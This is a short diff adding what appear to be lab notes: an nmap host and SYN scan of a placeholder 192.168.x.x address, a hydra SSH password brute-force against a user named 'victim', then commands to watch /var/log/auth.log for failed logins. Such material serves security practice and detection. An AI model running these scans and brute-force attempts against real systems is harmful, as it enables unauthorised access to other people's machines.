@@ -1,0 +1,9 @@
+nmap 192.168.x.x
+
+sudo nmap -sS 192.168.x.x
+
+hydra -l victim -P passwords.txt ssh://192.168.x.x
+
+sudo grep "Failed password" /var/log/auth.log
+
+sudo tail -f /var/log/auth.log
